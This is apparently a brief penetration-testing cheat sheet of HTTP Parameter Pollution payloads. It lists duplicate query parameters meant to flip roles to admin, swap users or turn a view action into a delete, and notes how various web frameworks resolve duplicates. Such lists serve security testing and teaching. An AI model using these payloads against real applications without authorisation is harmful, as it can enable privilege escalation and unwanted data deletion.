# HTTP Parameter Pollution (HPP) Payloads

## ========================================
## BASIC HPP
## ========================================

# Duplicate parameters
?id=1&id=2
?user=victim&user=attacker
?role=user&role=admin

# Multiple same parameters
?page=1&page=2&page=3
?action=view&action=delete

## ========================================
## BACKEND-SPECIFIC BEHAVIOR
## ========================================

# PHP/Apache - Last parameter wins
?param=value1&param=value2
Result: param=value2

# ASP.NET/IIS - Concatenates with comma
?param=value1&param=value2
Result: param=value1,value2

# JSP/Tomcat - First parameter wins
?param=value1&param=value2
Result: param=value1

# Perl (CGI.pm) - Creates array
?param=value1&param=value2
Result: param=[value1, value2]

# Python (Flask/Django) - Last parameter wins
?param=value1&param=value2
Result: param=value2
